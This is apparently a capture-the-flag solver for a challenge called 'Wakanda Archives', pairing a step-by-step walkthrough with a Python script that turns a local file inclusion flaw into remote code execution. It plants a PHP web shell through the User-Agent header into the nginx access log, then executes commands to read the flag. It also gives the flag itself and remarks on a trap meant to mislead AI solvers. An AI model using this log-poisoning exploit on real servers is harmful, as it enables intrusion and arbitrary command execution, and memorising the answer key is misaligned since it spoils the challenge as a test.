"""
C23 Solver — Wakanda Archives (LFI → RCE via Log Poisoning)

Step 1: Confirm LFI
  GET /?file=../../../../etc/hostname
  (passwd/shadow blocked, but hostname is not)

Step 2: Identify nginx from Server response header
  curl -I http://<host>/ → Server: nginx
  AI trap: AI tries /var/log/apache2/access.log → 404/empty (it's nginx)
           Correct path: /var/log/nginx/access.log

Step 3: Poison the nginx access log
  Send PHP code in User-Agent header:
  curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://<host>/

Step 4: Execute via LFI
  GET /?file=/var/log/nginx/access.log&c=cat+/flag.txt
"""
import requests

TARGET = "http://<host>:<port>"

# Step 3: Poison log
requests.get(TARGET, headers={"User-Agent": "<?php system($_GET['c']); ?>"})

# Step 4: Execute
r = requests.get(TARGET, params={
    "file": "/var/log/nginx/access.log",
    "c": "cat /flag.txt"
})
import re
m = re.search(r'cyn0x\{[^}]+\}', r.text)
if m: print(m.group())
# Output: cyn0x{lf1_l0g_p01s0n_w4k4nd4_f0r3v3r}